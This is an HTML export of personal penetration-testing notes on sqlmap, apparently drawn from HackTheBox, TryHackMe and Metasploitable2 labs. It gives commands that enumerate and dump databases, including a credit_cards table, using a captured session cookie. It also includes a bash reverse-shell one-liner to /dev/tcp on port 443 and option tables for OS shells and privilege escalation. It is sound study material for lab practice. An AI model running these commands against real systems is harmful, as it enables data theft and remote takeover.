<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Sqlmap</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Sqlmap</h1><br/><p>SQLmap is an open-source tool used in penetration testing to detect and exploit SQL</p><p>injection flaws. SQLmap automates the process of detecting and exploiting SQL</p><p>injection. SQL Injection attacks can take control of databases that utilize SQL.</p><p></p><p>The sqlmap comes pre-installed with Parrot OS &amp; Kali Linux, however, you can install it through the</p><p>repository if you don&#39;t have it:</p><p></p><p>sudo apt install sqlmap</p><p></p><p><img src="images/35-1.png" alt="images/35-1.png" /></p><p></p><p>We will provide the URL &amp; the cookie to the sqlmap in order for it to find vulnerability. The reason why we</p><p>have to provide a cookie is because of authentication:</p><p></p><p></p><p>To grab the cookie, we can intercept any request in Burp Suite &amp; get it from there,  OR  you can install a</p><p>great extension for your web browser called cookie-editor :</p><p></p><p>The cookies in HTTP messages of requests are usually set the following way: [Found from cookie editor]</p><p></p><p>PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1</p><p></p><p>Knowing that, here&#39;s how our sqlmap syntax should look:</p><p></p><p>sqlmap -u &#39;<a href="http://10.129.95.174/dashboard.php?search=any+query'">http://10.129.95.174/dashboard.php?search=any+query&#39;</a> --cookie=&quot;PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1&quot;</p><p></p><p><img src="images/35-2.png" alt="images/35-2.png" /></p><p></p><p>Note: We got the shell in sqlmap, however, it is not very stable &amp; interactive. To make it much stable, we will use the</p><p>following payload:</p><p>bash -c &quot;bash -i &gt;&amp; /dev/tcp/{your_IP}/443 0&gt;&amp;1&quot;</p><p></p><p>This method is used to bring <strong>sqlmap</strong> shell into our netcat listener.</p><p></p><p></p><p></p><p><strong>Using Metaploitable2:::::</strong></p><p>Enumeration-Choose options wisely</p><p>sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; </p><p></p><p>To get all Databases:</p><p>sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --dbs</p><p></p><p>To get all Tables of a Database(owasp10):</p><p> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --tables -D oswasp10</p><p> </p><p> To get all columns of a table (credit_cards) from database (owasp10):</p><p> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; --columns -T credit_cards -D owasp10</p><p> </p><p> To dump all data of a table:</p><p> sqlmap -u &quot;http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&amp;password=123123&amp;user-info-php-submit-button=View+Account+Details&quot; -T credit_cards -D owasp10 --dump</p><p> </p><p> </p><p> </p><p><strong> Example of gaming website THM:</strong></p><p> </p><p><em>sqlmap -r request.txt --dbms=mysql --dump</em></p><p></p><p>Where request.txt is a GET request captured by <em>burpsuite</em> for a “test” search querry.</p><p></p><p></p><p><strong></strong></p><p><strong>SQLMAP Room THM:</strong></p><p></p><p><em><strong>https://github.com/sqlmapproject/sqlmap</strong></em></p><p><em><strong></strong></em></p><p>sqlmap -h 	:	To list help with most common commands</p><p>sqlmap -hh	:	To list advanced help with all commands</p><p></p><p><strong>Basic Commands:</strong></p><p><table class="table"><tr><th>Options</th><th>Description</th></tr><tr><td>-u URL, --url=URL</td><td>Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</td></tr><tr><td>--data=DATA</td><td>Data string to be sent through POST (e.g. &quot;id=1&quot;)</td></tr><tr><td>--random-agent</td><td>Use randomly selected HTTP User-Agent header value</td></tr><tr><td>-p TESTPARAMETER</td><td>Testable parameter(s)</td></tr><tr><td>--level=LEVEL</td><td>Level of tests to perform (1-5, default 1)</td></tr><tr><td>--risk=RISK</td><td>Risk of tests to perform (1-3, default 1)</td></tr></table></p><p></p><p></p><p><strong>Enumeration Commands:</strong></p><p><em>These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.</em></p><p><table class="table"><tr><th>Options</th><th>Description</th></tr><tr><td>-a, --all</td><td>Retrieve everything</td></tr><tr><td>-b, --banner</td><td>Retrieve DBMS banner</td></tr><tr><td>--current-user</td><td>Retrieve DBMS current user</td></tr><tr><td>--current-db</td><td>Retrieve DBMS current database</td></tr><tr><td>--passwords</td><td>Enumerate DBMS users password hashes</td></tr><tr><td>--dbs</td><td>Enumerate DBMS databases</td></tr><tr><td>--tables</td><td>Enumerate DBMS database tables</td></tr><tr><td>--columns</td><td>Enumerate DBMS database table columns</td></tr><tr><td>--schema</td><td>Enumerate DBMS schema</td></tr><tr><td>--dump</td><td>Dump DBMS database table entries</td></tr><tr><td>--dump-all</td><td>Dump all DBMS databases tables entries</td></tr><tr><td>--is-dba</td><td>Detect if the DBMS current user is DBA</td></tr><tr><td>-D &lt;DB NAME&gt;</td><td>DBMS database to enumerate</td></tr><tr><td>-T &lt;TABLE NAME&gt;</td><td>DBMS database table(s) to enumerate</td></tr><tr><td>-C COL</td><td>DBMS database table column(s) to enumerate</td></tr></table></p><p></p><p></p><p><strong>Operating System Access Commands:</strong></p><p><em>These options can be used to access the back-end database management system on the target operating system.</em></p><p><table class="table"><tr><th>Options</th><th>Description</th></tr><tr><td>--os-shell</td><td>Prompt for an interactive operating system shell</td></tr><tr><td>--os-pwn</td><td>Prompt for an OOB shell, Meterpreter or VNC</td></tr><tr><td>--os-cmd=OSCMD</td><td>Execute an operating system command</td></tr><tr><td>--priv-esc</td><td>Database process user privilege escalation</td></tr><tr><td>--os-smbrelay</td><td>One-click prompt for an OOB shell, Meterpreter or VNC</td></tr></table></p><p></p><p></p><p><strong>Simple HTTP GET Based Test</strong></p><p></p><p>Format:</p><p><em><strong>sqlmap -u https://testsite.com/page.php?id=7 --dbs</strong></em></p><p></p><p></p><p><strong>Simple HTTP POST Based Test</strong></p><p>We copy the POST request to a file. (From Burpsuite copy to file or selecting the entire text in Burpsuite and copy it to a file. (say <strong>req.txt</strong>)</p><p><strong>Note:</strong> In case of post request we need to find the vulnerable payload location.</p><p>Eg. blood_group=A</p><p></p><p>Format:</p><p><em>sqlmap -r &lt;request_file&gt; -p &lt;vulnerable_parameter&gt; --dbs</em></p><p><em><strong>sqlmap -r req.txt -p blood_group --dbs</strong></em></p><p></p><p><strong>Note:</strong> --dbs is used to enumerate the database. <em>It will list all databases.</em></p><p></p><p></p><p><strong>Then we can continue enumerating as follows (Enumerating Tables):</strong></p><p></p><p><strong>Using GET based Method</strong></p><p><em>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; --tables</em></p><p><em><strong>sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables</strong></em></p><p></p><p><strong>Using POST based Method</strong></p><p><em>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; --tables</em></p><p><em><strong>sqlmap -r req.txt -p blood_group -D blood --tables</strong></em></p><p></p><p></p><p><strong>Then we can continue enumerating as follows (Enumerating Columns):</strong></p><p></p><p><strong>Using GET based Method</strong></p><p><em>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</em></p><p><em><strong>sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns</strong></em></p><p><em><strong></strong></em></p><p><strong>Using POST based Method</strong></p><p><em>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; -T &lt;table_name&gt; --columns</em></p><p><em><strong>sqlmap -r req.txt -p blood_group -D blood -T blood_db --columns</strong></em></p><p></p><p><strong>Note:</strong> Here -p switch can be ignored becasue, sqlmap will resume from previous calls. (Else it is required in POST method during initial call)</p><p></p><p></p><p><strong>Finally to Dump the entire database:</strong></p><p></p><p><strong>Using GET based Method</strong></p><p><em>sqlmap -u https://testsite.com/page.php?id=7 -D &lt;database_name&gt; --dump-all</em></p><p><em><strong>sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all</strong></em></p><p><em><strong></strong></em></p><p><strong>Using POST based Method</strong></p><p><em>sqlmap -r req.txt -p &lt;vulnerable_parameter&gt; -D &lt;database_name&gt; --dump-all</em></p><p><em><strong>sqlmap -r req.txt -p blood_group -D blood --dump-all</strong></em></p><p></p></div>
</body>
</html>
